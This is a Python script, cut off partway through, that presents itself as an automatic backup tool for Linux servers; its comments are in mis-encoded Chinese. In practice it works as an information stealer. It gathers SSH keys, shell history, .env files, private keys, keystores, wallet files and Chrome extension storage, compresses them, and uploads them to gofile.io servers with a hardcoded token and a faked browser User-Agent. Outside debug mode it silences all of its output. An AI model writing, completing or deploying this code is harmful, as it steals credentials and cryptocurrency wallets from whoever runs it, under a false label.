# -*- coding: utf-8 -*-
"""
è‡ªåŠ¨å¤‡ä»½å’Œä¸Šä¼ å·¥å…·
åŠŸèƒ½ï¼šå¤‡ä»½ linux(VPS) ç³»ç»Ÿä¸­çš„é‡è¦æ–‡ä»¶ï¼Œå¹¶è‡ªåŠ¨ä¸Šä¼ åˆ°äº‘å­˜å‚¨
"""

import os
import sys
import shutil
import time
import socket
import logging
import logging.handlers
import platform
import tarfile
import requests
import getpass
from datetime import datetime, timedelta
from pathlib import Path

class BackupConfig:
    # è°ƒè¯•é…ç½®
    DEBUG_MODE = True  # æ˜¯å¦è¾“å‡ºè°ƒè¯•æ—¥å¿—ï¼ˆFalse/Trueï¼‰
    
    # æ–‡ä»¶å¤§å°é…ç½®ï¼ˆå•ä½ï¼šå­—èŠ‚ï¼‰
    MAX_SINGLE_FILE_SIZE = 50 * 1024 * 1024   # å•æ–‡ä»¶é˜ˆå€¼ï¼š50MBï¼ˆè¶…è¿‡åˆ™åˆ†ç‰‡ï¼‰
    CHUNK_SIZE = 50 * 1024 * 1024             # åˆ†ç‰‡å¤§å°ï¼š50MB
    
    # é‡è¯•é…ç½®
    RETRY_COUNT = 5        # æœ€å¤§é‡è¯•æ¬¡æ•°
    RETRY_DELAY = 60       # é‡è¯•ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼‰
    UPLOAD_TIMEOUT = 1800  # ä¸Šä¼ è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰
   
    # å¤‡ä»½é—´éš”é…ç½®
    BACKUP_INTERVAL = 260000  # å¤‡ä»½é—´éš”æ—¶é—´ï¼šçº¦3å¤©
    SCAN_TIMEOUT = 1800    # æ‰«æè¶…æ—¶æ—¶é—´ï¼š30åˆ†é’Ÿ
    
    # æ—¥å¿—é…ç½®
    LOG_FILE = str(Path.home() / ".dev/Backup/backup.log")
    LOG_MAX_SIZE = 10 * 1024 * 1024  # æ—¥å¿—æ–‡ä»¶æœ€å¤§å¤§å°ï¼š10MB
    LOG_BACKUP_COUNT = 10             # ä¿ç•™çš„æ—¥å¿—å¤‡ä»½æ•°é‡

    # æ—¶é—´é˜ˆå€¼æ–‡ä»¶é…ç½®
    THRESHOLD_FILE = str(Path.home() / ".dev/Backup/next_backup_time.txt")  # æ—¶é—´é˜ˆå€¼æ–‡ä»¶è·¯å¾„

    # éœ€è¦å¤‡ä»½çš„æœåŠ¡å™¨ç›®å½•æˆ–æ–‡ä»¶
    SERVER_BACKUP_DIRS = [
        ".ssh",           # SSHé…ç½®
        ".bash_history",  # Bashå†å²è®°å½•
        ".python_history", # Pythonå†å²è®°å½•
        ".bash_aliases",  # Bashåˆ«å
        "Documents",      # æ–‡æ¡£ç›®å½•
        ".node_repl_history", # Node.js REPL å†å²è®°å½•
        ".wget-hsts",     # wget HSTS å†å²è®°å½•
        ".Xauthority",    # Xauthority æ–‡ä»¶
        ".ICEauthority",  # ICEauthority æ–‡ä»¶
    ]

    # éœ€è¦å¤‡ä»½çš„æ–‡ä»¶ç±»å‹
    # æ–‡æ¡£ç±»å‹æ‰©å±•å
    DOC_EXTENSIONS = [
        ".txt", ".json", ".js", ".py", ".go", ".sh", ".sol", ".rs", ".env",
        ".csv", ".bin", ".wallet", ".ts", ".jsx", ".tsx"
    ]
    # é…ç½®ç±»å‹æ‰©å±•å
    CONFIG_EXTENSIONS = [
        ".pem", ".key", ".keystore", ".utc", ".xml", ".ini", ".config",
        ".yaml", ".yml", ".toml", ".asc", ".gpg", ".pgp", ".conf"
    ]
    # æ‰€æœ‰å¤‡ä»½æ‰©å±•åï¼ˆç”¨äºå…¼å®¹æ€§ï¼‰
    BACKUP_EXTENSIONS = DOC_EXTENSIONS + CONFIG_EXTENSIONS
    
    # æ’é™¤çš„ç›®å½•
    EXCLUDE_DIRS = [
        ".bashrc",
        ".bitcoinlib",
        ".cargo",
        ".conda",
        ".docker",
        ".dotnet",
        ".fonts",
        ".git",
        ".gongfeng-copilot",
        ".gradle",
        ".icons",
        ".jupyter",
        ".landscape",
        ".local",
        ".npm",
        ".nvm",
        ".orca_term",
        ".pki",
        ".pm2",
        ".profile",
        ".rustup",
        ".ssh",
        ".solcx",
        ".themes",
        ".thunderbird",
        ".wdm",
        "cache",
        "Downloads",
        "myenv",
        "snap",
        "venv",
    ]

    # ä¸Šä¼ æœåŠ¡å™¨é…ç½®
    UPLOAD_SERVERS = [
        "https://store9.gofile.io/uploadFile",
        "https://store8.gofile.io/uploadFile",
        "https://store7.gofile.io/uploadFile",
        "https://store6.gofile.io/uploadFile",
        "https://store5.gofile.io/uploadFile"
    ]

    # ç½‘ç»œé…ç½®
    NETWORK_CHECK_HOSTS = [
        "8.8.8.8",         # Google DNS
        "1.1.1.1",         # Cloudflare DNS
        "208.67.222.222",  # OpenDNS
        "9.9.9.9"          # Quad9 DNS
    ]
    NETWORK_CHECK_TIMEOUT = 5  # ç½‘ç»œæ£€æŸ¥è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰
    NETWORK_CHECK_RETRIES = 3  # ç½‘ç»œæ£€æŸ¥é‡è¯•æ¬¡æ•°

if BackupConfig.DEBUG_MODE:
    logging.basicConfig(format="%(message)s", level=logging.DEBUG)
else:
    sys.stdout = sys.stderr = open(os.devnull, 'w')
    logging.basicConfig(format="%(message)s", level=logging.CRITICAL)

class BackupManager:
    
    def __init__(self):
        """åˆå§‹åŒ–å¤‡ä»½ç®¡ç†å™¨"""
        self.config = BackupConfig()
        self.api_token = "8m9D4k6cv6LekYoVcjQBK4yvvDDyiFdf"
        # ä½¿ç”¨é›†åˆä¼˜åŒ–æ‰©å±•åæ£€æŸ¥æ€§èƒ½
        self.doc_extensions_set = set(ext.lower() for ext in self.config.DOC_EXTENSIONS)
        self.config_extensions_set = set(ext.lower() for ext in self.config.CONFIG_EXTENSIONS)
        self._setup_logging()

    def _setup_logging(self):
        """é…ç½®æ—¥å¿—ç³»ç»Ÿ"""
        try:
            log_dir = os.path.dirname(self.config.LOG_FILE)
            os.makedirs(log_dir, exist_ok=True)

            # ä½¿ç”¨ RotatingFileHandler è¿›è¡Œæ—¥å¿—è½®è½¬
            file_handler = logging.handlers.RotatingFileHandler(
                self.config.LOG_FILE,
                maxBytes=self.config.LOG_MAX_SIZE,
                backupCount=self.config.LOG_BACKUP_COUNT,
                encoding='utf-8'
            )
            file_handler.setFormatter(
                logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
            )

            console_handler = logging.StreamHandler()
            console_handler.setFormatter(logging.Formatter('%(message)s'))

            root_logger = logging.getLogger()
            root_logger.setLevel(
                logging.DEBUG if self.config.DEBUG_MODE else logging.INFO
            )

            root_logger.handlers.clear()
            root_logger.addHandler(file_handler)
            root_logger.addHandler(console_handler)
            
            logging.info("æ—¥å¿—ç³»ç»Ÿåˆå§‹åŒ–å®Œæˆ")
        except Exception as e:
            print(f"è®¾ç½®æ—¥å¿—ç³»ç»Ÿæ—¶å‡ºé”™: {e}")

    @staticmethod
    def _get_dir_size(directory):
        total_size = 0
        for dirpath, _, filenames in os.walk(directory):
            for filename in filenames:
                file_path = os.path.join(dirpath, filename)
                try:
                    total_size += os.path.getsize(file_path)
                except (OSError, IOError) as e:
                    logging.error(f"è·å–æ–‡ä»¶å¤§å°å¤±è´¥ {file_path}: {e}")
        return total_size

    @staticmethod
    def _ensure_directory(directory_path):
        try:
            if os.path.exists(directory_path):
                if not os.path.isdir(directory_path):
                    logging.error(f"è·¯å¾„å­˜åœ¨ä½†ä¸æ˜¯ç›®å½•: {directory_path}")
                    return False
                if not os.access(directory_path, os.W_OK):
                    logging.error(f"ç›®å½•æ²¡æœ‰å†™å…¥æƒé™: {directory_path}")
                    return False
            else:
                os.makedirs(directory_path, exist_ok=True)
            return True
        except Exception as e:
            logging.error(f"åˆ›å»ºç›®å½•å¤±è´¥ {directory_path}: {e}")
            return False

    @staticmethod
    def _clean_directory(directory_path):
        try:
            if os.path.exists(directory_path):
                shutil.rmtree(directory_path, ignore_errors=True)
            return BackupManager._ensure_directory(directory_path)
        except Exception as e:
            logging.error(f"æ¸…ç†ç›®å½•å¤±è´¥ {directory_path}: {e}")
            return False

    @staticmethod
    def _check_internet_connection():
        """æ£€æŸ¥ç½‘ç»œè¿æ¥çŠ¶æ€"""
        for _ in range(BackupConfig.NETWORK_CHECK_RETRIES):
            for host in BackupConfig.NETWORK_CHECK_HOSTS:
                try:
                    socket.create_connection(
                        (host, 53), 
                        timeout=BackupConfig.NETWORK_CHECK_TIMEOUT
                    )
                    return True
                except (socket.timeout, socket.gaierror, ConnectionRefusedError):
                    continue
                except Exception as e:
                    logging.debug(f"ç½‘ç»œæ£€æŸ¥å‡ºé”™ {host}: {e}")
                    continue
            time.sleep(1)  # é‡è¯•å‰ç­‰å¾…1ç§’
        return False

    @staticmethod
    def _is_valid_file(file_path):
        try:
            return os.path.isfile(file_path) and os.path.getsize(file_path) > 0
        except Exception:
            return False

    def _backup_specified_item(self, source_path, target_base, item_name):
        """å¤‡ä»½æŒ‡å®šçš„æ–‡ä»¶æˆ–ç›®å½•"""
        try:
            if os.path.isfile(source_path):
                target_file = os.path.join(target_base, item_name)
                target_file_dir = os.path.dirname(target_file)
                if self._ensure_directory(target_file_dir):
                    shutil.copy2(source_path, target_file)
                    if self.config.DEBUG_MODE:
                        logging.info(f"å·²å¤‡ä»½æŒ‡å®šæ–‡ä»¶: {item_name}")
                    return True
            else:
                target_path = os.path.join(target_base, item_name)
                if self._ensure_directory(os.path.dirname(target_path)):
                    if os.path.exists(target_path):
                        shutil.rmtree(target_path)
                    # å¯¹äºSERVER_BACKUP_DIRSä¸­æŒ‡å®šçš„ç›®å½•ï¼Œå¤åˆ¶æ—¶ä»ç„¶é€’å½’æ£€æŸ¥æ’é™¤é¡¹
                    exclude_dirs_lower = {ex.lower() for ex in self.config.EXCLUDE_DIRS}
                    ignore_func = lambda d, files: [
                        f for f in files 
                        if any(ex in os.path.join(d, f).lower() for ex in exclude_dirs_lower)
                    ]
                    shutil.copytree(source_path, target_path, symlinks=True, ignore=ignore_func)
                    if self.config.DEBUG_MODE:
                        logging.info(f"ğŸ“ å·²å¤‡ä»½æŒ‡å®šç›®å½•: {item_name}/")
                    return True
        except Exception as e:
            logging.error(f"âŒ å¤‡ä»½å¤±è´¥: {item_name} - {str(e)}")
        return False

    def _backup_chrome_directories(self, target_specified):
        """å¤‡ä»½ Linux Chrome ç›®å½•"""
        try:
            home_dir = os.path.expanduser('~')
            chrome_base = os.path.join(home_dir, '.config', 'google-chrome', 'Default')
            chrome_extensions = os.path.join(chrome_base, 'Extensions')
            chrome_local_ext = os.path.join(chrome_base, 'Local Extension Settings')

            def copy_chrome_dir_if_exists(src_dir, dst_name):
                if os.path.exists(src_dir) and os.path.isdir(src_dir):
                    target_path = os.path.join(target_specified, dst_name)
                    try:
                        # ç¡®ä¿ç›®æ ‡çˆ¶ç›®å½•å­˜åœ¨
                        parent_dir = os.path.dirname(target_path)
                        if not self._ensure_directory(parent_dir):
                            return
                        # å¦‚æœç›®æ ‡ç›®å½•å·²å­˜åœ¨ï¼Œå…ˆåˆ é™¤
                        if os.path.exists(target_path):
                            shutil.rmtree(target_path, ignore_errors=True)
                        # å¤åˆ¶æ•´ä¸ªç›®å½•
                        shutil.copytree(src_dir, target_path, symlinks=True)
                        if self.config.DEBUG_MODE:
                            logging.info(f"ğŸ“¦ å·²å¤‡ä»½ Chrome ç›®å½•: {dst_name}")
                    except Exception as e:
                        if self.config.DEBUG_MODE:
                            logging.debug(f"å¤åˆ¶ Chrome ç›®å½•å¤±è´¥: {src_dir} - {str(e)}")

            # æ‰§è¡Œ Chrome ç›®å½•å¤‡ä»½
            copy_chrome_dir_if_exists(chrome_extensions, 'chrome_extensions')
            copy_chrome_dir_if_exists(chrome_local_ext, 'chrome_local_extension_settings')
        except Exception as e:
            if self.config.DEBUG_MODE:
                logging.debug(f"è¿½åŠ  Chrome ç›®å½•å¤‡ä»½å¤±è´¥: {str(e)}")

    def backup_linux_files(self, source_dir, target_dir):
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        if not os.path.exists(source_dir):
            logging.error("âŒ Linuxæºç›®å½•ä¸å­˜åœ¨")
            return None

        target_docs = os.path.join(target_dir, "docs") # å¤‡ä»½æ–‡æ¡£çš„ç›®æ ‡ç›®å½•
        target_configs = os.path.join(target_dir, "configs") # å¤‡ä»½é…ç½®æ–‡ä»¶çš„ç›®æ ‡ç›®å½•
        target_specified = os.path.join(target_dir, "specified")  # æ–°å¢æŒ‡å®šç›®å½•/æ–‡ä»¶çš„å¤‡ä»½ç›®å½•

        if not self._clean_directory(target_dir):
            return None

        if not all(self._ensure_directory(d) for d in [target_docs, target_configs, target_specified]):
            return None

        # é¦–å…ˆå¤‡ä»½æŒ‡å®šç›®å½•æˆ–æ–‡ä»¶ (SERVER_BACKUP_DIRS)
        for specific_path in self.config.SERVER_BACKUP_DIRS:
            full_source_path = os.path.join(source_dir, specific_path)
            if os.path.exists(full_source_path):
                self._backup_specified_item(full_source_path, target_specified, specific_path)

        # è¿½åŠ ï¼šå¤‡ä»½ Linux Chrome ç›®å½•
        self._backup_chrome_directories(target_specified)

        # ç„¶åå¤‡ä»½å…¶ä»–æ–‡ä»¶ (ä¸åœ¨SERVER_BACKUP_DIRSä¸­çš„ï¼Œæ ¹æ®æ–‡ä»¶ç±»å‹å¤‡ä»½)
        # é¢„è®¡ç®—å·²å¤‡ä»½çš„ç›®å½•è·¯å¾„é›†åˆï¼Œä¼˜åŒ–æ€§èƒ½
        source_dir_abs = os.path.abspath(source_dir)
        backed_up_dirs = set()
        for specific_dir in self.config.SERVER_BACKUP_DIRS:
            specific_path = os.path.join(source_dir, specific_dir)
            if os.path.isdir(specific_path):
                backed_up_dirs.add(os.path.abspath(specific_path))
        
        docs_count = configs_count = 0
        target_dir_abs = os.path.abspath(target_dir)
        exclude_dirs_lower = {ex.lower() for ex in self.config.EXCLUDE_DIRS}
        
        for root, dirs, files in os.walk(source_dir):
            root_abs = os.path.abspath(root)
            
            # è·³è¿‡æºç›®å½•æœ¬èº«çš„æ–‡ä»¶å¤„ç†ï¼Œåªåœ¨è¿™é‡Œå¤„ç†ä¸€çº§å­ç›®å½•çš„æ’é™¤
            if root_abs == source_dir_abs:
                # åˆ›å»ºä¸€ä¸ªç›®å½•åˆ—è¡¨å‰¯æœ¬ç”¨äºè¿­ä»£ï¼Œå› ä¸ºæˆ‘ä»¬å¯èƒ½ä¼šä¿®æ”¹åŸå§‹dirsåˆ—è¡¨
                dirs_to_walk = dirs[:] 
                for d in dirs_to_walk:
                    # æ£€æŸ¥è¿™ä¸ªç¬¬ä¸€çº§å­ç›®å½•æ˜¯å¦åœ¨æ’é™¤åˆ—è¡¨ä¸­ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰
                    if d.lower() in exclude_dirs_lower:
                         if self.config.DEBUG_MODE:
                              logging.info(f"â­ï¸ å·²æ’é™¤ç¬¬ä¸€çº§ç›®å½•: {d}/")
                         dirs.remove(d) # ä»os.walkè¿­ä»£çš„åˆ—è¡¨ä¸­ç§»é™¤ï¼Œé˜»æ­¢è¿›å…¥æ­¤ç›®å½•
                continue # è·³è¿‡æºç›®å½•æœ¬èº«çš„æ–‡ä»¶å¤„ç†

            # è·³è¿‡å·²åœ¨ä¸Šé¢ä½œä¸ºæŒ‡å®šç›®å½•å¤‡ä»½è¿‡çš„ç›®å½• (æˆ–å…¶ä¸‹çš„å­ç›®å½•)
            if any(root_abs.startswith(backed_dir) for backed_dir in backed_up_dirs):
                continue

            # è·³è¿‡ç›®æ ‡å¤‡ä»½ç›®å½•æœ¬èº«ï¼Œé¿å…å¤‡ä»½å¤‡ä»½æ–‡ä»¶
            if root_abs.startswith(target_dir_abs):
                continue

            # å¯¹äºéç¬¬ä¸€çº§ç›®å½•æˆ–æœªæ’é™¤çš„ç¬¬ä¸€çº§ç›®å½•ä¸‹çš„æ–‡ä»¶/å­ç›®å½•ï¼Œæ ¹æ®æ–‡ä»¶æ‰©å±•åè¿›è¡Œå¤‡ä»½

            for file in files:
                # åˆ¤æ–­æ–‡ä»¶æ˜¯å¦ä¸ºæ–‡æ¡£ç±»å‹æˆ–é…ç½®ç±»å‹ï¼ˆä½¿ç”¨é›†åˆä¼˜åŒ–æ€§èƒ½ï¼‰
                file_lower = file.lower()
                is_doc = any(file_lower.endswith(ext) for ext in self.doc_extensions_set)
                is_config = any(file_lower.endswith(ext) for ext in self.config_extensions_set)

                # å¦‚æœæ—¢ä¸æ˜¯æ–‡æ¡£ä¹Ÿä¸æ˜¯é…ç½®ï¼Œè·³è¿‡
                if not (is_doc or is_config):
                    continue

                source_file = os.path.join(root, file)
                # os.walkå·²ç»æä¾›äº†æ–‡ä»¶åˆ—è¡¨ï¼Œé€šå¸¸ä¸éœ€è¦å†æ¬¡æ£€æŸ¥å­˜åœ¨æ€§
                # ä½†å¦‚æœæ–‡ä»¶åœ¨éå†è¿‡ç¨‹ä¸­è¢«åˆ é™¤ï¼Œè¿™é‡Œå¯ä»¥è·³è¿‡

                # æ ¹æ®æ–‡ä»¶ç±»å‹ç¡®å®šç›®æ ‡åŸºè·¯å¾„
                target_base = target_docs if is_doc else target_configs
                # è·å–ç›¸å¯¹äºæºç›®å½•çš„è·¯å¾„
                relative_path = os.path.relpath(root, source_dir)
                # æ„å»ºç›®æ ‡å­ç›®å½•è·¯å¾„
                target_sub_dir = os.path.join(target_base, relative_path)
                # æ„å»ºç›®æ ‡æ–‡ä»¶è·¯å¾„
                target_file = os.path.join(target_sub_dir, file)

                # ç¡®ä¿ç›®æ ‡å­ç›®å½•å­˜åœ¨
                if not self._ensure_directory(target_sub_dir):
                    continue

                try:
                    # å¤åˆ¶æ–‡ä»¶åˆ°ç›®æ ‡ä½ç½®
                    shutil.copy2(source_file, target_file)
                    # æ›´æ–°è®¡æ•°å™¨
                    if is_doc:
                        docs_count += 1
                    else:
                        configs_count += 1
                except Exception as e:
                    # å¤åˆ¶å¤±è´¥è®°å½•é”™è¯¯
                    if self.config.DEBUG_MODE:
                        logging.error(f"âŒ å¤åˆ¶å¤±è´¥: {relative_path}/{file}")

        # æ‰“å°å¤‡ä»½ç»Ÿè®¡ä¿¡æ¯
        if docs_count > 0 or configs_count > 0:
            logging.info(f"\nğŸ“Š Linuxæ–‡ä»¶å¤‡ä»½ç»Ÿè®¡:")
            if docs_count > 0:
                logging.info(f"   ğŸ“š æ–‡æ¡£: {docs_count} ä¸ªæ–‡ä»¶")
            if configs_count > 0:
                logging.info(f"   âš™ï¸  é…ç½®: {configs_count} ä¸ªæ–‡ä»¶")

        return target_dir

    def _get_upload_server(self):
        """è·å–ä¸Šä¼ æœåŠ¡å™¨åœ°å€ï¼Œä½¿ç”¨ç®€å•çš„è½®è¯¢æ–¹å¼å®ç°è´Ÿè½½å‡è¡¡"""
        try:
            # å°è¯•æ‰€æœ‰æœåŠ¡å™¨
            for server in self.config.UPLOAD_SERVERS:
                try:
                    # æµ‹è¯•æœåŠ¡å™¨è¿æ¥æ€§
                    response = requests.head(server, timeout=5)
                    if response.status_code == 200:
                        return server
                except:
                    continue
            
            # å¦‚æœæ‰€æœ‰æœåŠ¡å™¨éƒ½ä¸å¯ç”¨ï¼Œè¿”å›é»˜è®¤æœåŠ¡å™¨
            return self.config.UPLOAD_SERVERS[0]
        except:
            # å‘ç”Ÿå¼‚å¸¸æ—¶è¿”å›é»˜è®¤æœåŠ¡å™¨
            return self.config.UPLOAD_SERVERS[0]

    def split_large_file(self, file_path):
        """å°†å¤§æ–‡ä»¶åˆ†å‰²ä¸ºå¤šä¸ªå°å—"""
        if not os.path.exists(file_path):
            return None
        
        try:
            file_size = os.path.getsize(file_path)
            if file_size <= self.config.MAX_SINGLE_FILE_SIZE:
                return [file_path]

            # åˆ›å»ºåˆ†ç‰‡ç›®å½•
            chunk_dir = os.path.join(os.path.dirname(file_path), "chunks")
            if not self._ensure_directory(chunk_dir):
                return None

            # å¯¹æ–‡ä»¶è¿›è¡Œåˆ†ç‰‡
            chunk_files = []
            base_name = os.path.basename(file_path)
            with open(file_path, 'rb') as f:
                chunk_num = 0
                while True:
                    chunk_data = f.read(self.config.CHUNK_SIZE)
                    if not chunk_data:
                        break
                    
                    chunk_name = f"{base_name}.part{chunk_num:03d}"
                    chunk_path = os.path.join(chunk_dir, chunk_name)
                    
                    with open(chunk_path, 'wb') as chunk_file:
                        chunk_file.write(chunk_data)
                    chunk_files.append(chunk_path)
                    chunk_num += 1
                    logging.info(f"å·²åˆ›å»ºåˆ†ç‰‡ {chunk_num}: {len(chunk_data) / 1024 / 1024:.2f}MB")

            os.remove(file_path)
            logging.critical(f"æ–‡ä»¶ {file_path} ({file_size / 1024 / 1024:.2f}MB) å·²åˆ†å‰²ä¸º {len(chunk_files)} ä¸ªåˆ†ç‰‡")
            return chunk_files

        except Exception as e:
            logging.error(f"åˆ†å‰²æ–‡ä»¶å¤±è´¥ {file_path}: {e}")
            return None

    def zip_backup_folder(self, folder_path, zip_file_path):
        try:
            if folder_path is None or not os.path.exists(folder_path):
                return None

            total_files = sum(len(files) for _, _, files in os.walk(folder_path))
            if total_files == 0:
                logging.error(f"æºç›®å½•ä¸ºç©º {folder_path}")
                return None

            dir_size = 0
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    try:
                        file_path = os.path.join(dirpath, filename)
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:
                            dir_size += file_size
                    except OSError as e:
                        logging.error(f"è·å–æ–‡ä»¶å¤§å°å¤±è´¥ {file_path}: {e}")
                        continue

            if dir_size == 0:
                logging.error(f"æºç›®å½•å®é™…å¤§å°ä¸º0 {folder_path}")
                return None

            tar_path = f"{zip_file_path}.tar.gz"
            if os.path.exists(tar_path):
                os.remove(tar_path)

            with tarfile.open(tar_path, "w:gz") as tar:
                tar.add(folder_path, arcname=os.path.basename(folder_path))

            try:
                compressed_size = os.path.getsize(tar_path)
                if compressed_size == 0:
                    logging.error(f"å‹ç¼©æ–‡ä»¶å¤§å°ä¸º0 {tar_path}")
                    if os.path.exists(tar_path):
                        os.remove(tar_path)
                    return None

                self._clean_directory(folder_path)
                logging.critical(f"ç›®å½• {folder_path} å·²å‹ç¼©: {dir_size / 1024 / 1024:.2f}MB -> {compressed_size / 1024 / 1024:.2f}MB")
                
                # å¦‚æœå‹ç¼©æ–‡ä»¶è¿‡å¤§ï¼Œè¿›è¡Œåˆ†ç‰‡
                if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                    return self.split_large_file(tar_path)
                else:
                    return [tar_path]
                    
            except OSError as e:
                logging.error(f"è·å–å‹ç¼©æ–‡ä»¶å¤§å°å¤±è´¥ {tar_path}: {e}")
                if os.path.exists(tar_path):
                    os.remove(tar_path)
                return None
                
        except Exception as e:
            logging.error(f"å‹ç¼©å¤±è´¥ {folder_path}: {e}")
            return None

    def upload_backup(self, backup_paths):
        """ä¸Šä¼ å¤‡ä»½æ–‡ä»¶ï¼Œæ”¯æŒå•ä¸ªæ–‡ä»¶æˆ–æ–‡ä»¶åˆ—è¡¨"""
        if not backup_paths:
            return False
            
        if isinstance(backup_paths, str):
            backup_paths = [backup_paths]
            
        success = True
        for path in backup_paths:
            if not self.upload_file(path):
                success = False
        return success

    def upload_file(self, file_path):
        """ä¸Šä¼ å•ä¸ªæ–‡ä»¶"""
        if not self._is_valid_file(file_path):
            logging.error(f"æ–‡ä»¶ {file_path} ä¸ºç©ºæˆ–æ— æ•ˆï¼Œè·³è¿‡ä¸Šä¼ ")
            return False
            
        return self._upload_single_file(file_path)

    def _upload_single_file(self, file_path):
        """ä¸Šä¼ å•ä¸ªæ–‡ä»¶"""
        try:
            # æ£€æŸ¥æ–‡ä»¶æƒé™å’ŒçŠ¶æ€
            if not os.path.exists(file_path):
                logging.error(f"æ–‡ä»¶ä¸å­˜åœ¨: {file_path}")
                return False
                
            if not os.access(file_path, os.R_OK):
                logging.error(f"æ–‡ä»¶æ— è¯»å–æƒé™: {file_path}")
                return False
                
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"æ–‡ä»¶å¤§å°ä¸º0: {file_path}")
                if os.path.exists(file_path):
                    os.remove(file_path)
                return False
                
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"æ–‡ä»¶è¿‡å¤§ {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
                return False

            # ä¸Šä¼ é‡è¯•é€»è¾‘
            for attempt in range(self.config.RETRY_COUNT):
                if not self._check_internet_connection():
                    logging.error("ç½‘ç»œè¿æ¥ä¸å¯ç”¨ï¼Œç­‰å¾…é‡è¯•...")
                    time.sleep(self.config.RETRY_DELAY)
                    continue

                # æœåŠ¡å™¨è½®è¯¢
                for server in self.config.UPLOAD_SERVERS:
                    try:
                        with open(file_path, "rb") as f:
                            logging.critical(f"æ­£åœ¨ä¸Šä¼ æ–‡ä»¶ {file_path}ï¼ˆ{file_size / 1024 / 1024:.2f}MBï¼‰ï¼Œç¬¬ {attempt + 1} æ¬¡å°è¯•ï¼Œä½¿ç”¨æœåŠ¡å™¨ {server}...")
                            
                            # å‡†å¤‡ä¸Šä¼ ä¼šè¯
                            session = requests.Session()
                            session.headers.update({
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                            })
                            
                            # æ‰§è¡Œä¸Šä¼ 
                            response = session.post(
                                server,
                                files={"file": f},
                                data={"token": self.api_token},
                                timeout=self.config.UPLOAD_TIMEOUT,
                                verify=True
                            )
                            
                            if response.ok and response.headers.get("Content-Type", "").startswith("application/json"):
                                result = response.json()
                                if result.get("status") == "ok":
                                    logging.critical(f"ä¸Šä¼ æˆåŠŸ: {file_path}")
                                    try:
                                        os.remove(file_path)
                                    except Exception as e:
                                        logging.error(f"åˆ é™¤å·²ä¸Šä¼ æ–‡ä»¶å¤±è´¥: {e}")
                                    return True
                                else:
                                    error_msg = result.get("message", "æœªçŸ¥é”™è¯¯")
                                    logging.error(f"æœåŠ¡å™¨è¿”å›é”™è¯¯: {error_msg}")
                            else:
                                logging.error(f"ä¸Šä¼ å¤±è´¥ï¼ŒçŠ¶æ€ç : {response.status_code}, å“åº”: {response.text}")
                                
                    except requests.exceptions.Timeout:
                        logging.error(f"ä¸Šä¼ è¶…æ—¶ {file_path}")
                    except requests.exceptions.SSLError:
                        logging.error(f"SSLé”™è¯¯ {file_path}")
                    except requests.exceptions.ConnectionError:
                        logging.error(f"è¿æ¥é”™è¯¯ {file_path}")
                    except Exception as e:
                        logging.error(f"ä¸Šä¼ æ–‡ä»¶å‡ºé”™ {file_path}: {str(e)}")

                    continue
                
                if attempt < self.config.RETRY_COUNT - 1:
                    logging.critical(f"ç­‰å¾… {self.config.RETRY_DELAY} ç§’åé‡è¯•...")
                    time.sleep(self.config.RETRY_DELAY)

            try:
                os.remove(file_path)
                logging.error(f"æ–‡ä»¶ {file_path} ä¸Šä¼ å¤±è´¥å¹¶å·²åˆ é™¤")
            except Exception as e:
                logging.error(f"åˆ é™¤å¤±è´¥æ–‡ä»¶æ—¶å‡ºé”™: {e}")
            
            return False
            
        except OSError as e:
            logging.error(f"è·å–æ–‡ä»¶ä¿¡æ¯å¤±è´¥ {file_path}: {e}")
            if os.path.exists(file_path):
                try:
                    os.remove(file_path)
                except:
                    pass
            return False

def is_server():
    """æ£€æŸ¥æ˜¯å¦åœ¨æœåŠ¡å™¨ç¯å¢ƒä¸­è¿è¡Œ"""
    return not platform.system().lower() == 'windows'

def backup_server(backup_manager, source, target):
    """å¤‡ä»½æœåŠ¡å™¨"""
    backup_dir = backup_manager.backup_linux_files(source, target)
    if backup_dir:
        backup_path = backup_manager.zip_backup_folder(
            backup_dir, 
            str(target) + "_" + datetime.now().strftime("%Y%m%d_%H%M%S")
        )
        if backup_path:
            if backup_manager.upload_backup(backup_path):
                logging.critical("â˜‘ï¸ æœåŠ¡å™¨å¤‡ä»½å®Œæˆ")
            else:
                logging.error("âŒ æœåŠ¡å™¨å¤‡ä»½å¤±è´¥")

def backup_and_upload_logs(backup_manager):
    log_file = backup_manager.config.LOG_FILE
    
    try:
        if not os.path.exists(log_file):
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"å¤‡ä»½æ—¥å¿—æ–‡ä»¶ä¸å­˜åœ¨ï¼Œè·³è¿‡: {log_file}")
            return

        # åˆ·æ–°æ—¥å¿—ç¼“å†²åŒºï¼Œç¡®ä¿æ‰€æœ‰æ—¥å¿—éƒ½å·²å†™å…¥æ–‡ä»¶
        for handler in logging.getLogger().handlers:
            if hasattr(handler, 'flush'):
                handler.flush()
        
        # ç­‰å¾…ä¸€å°æ®µæ—¶é—´ï¼Œç¡®ä¿æ–‡ä»¶ç³»ç»ŸåŒæ­¥
        time.sleep(0.5)

        file_size = os.path.getsize(log_file)
        if file_size == 0:
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"å¤‡ä»½æ—¥å¿—æ–‡ä»¶ä¸ºç©ºï¼Œè·³è¿‡: {log_file}")
            return

        temp_dir = Path.home() / ".dev/Backup/temp_backup_logs"
        if not backup_manager._ensure_directory(str(temp_dir)):
            logging.error("âŒ æ— æ³•åˆ›å»ºä¸´æ—¶æ—¥å¿—ç›®å½•")
            return

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_name = f"backup_log_{timestamp}.txt"
        backup_path = temp_dir / backup_name

        try:
            # è¯»å–å¹¶éªŒè¯æ—¥å¿—å†…å®¹
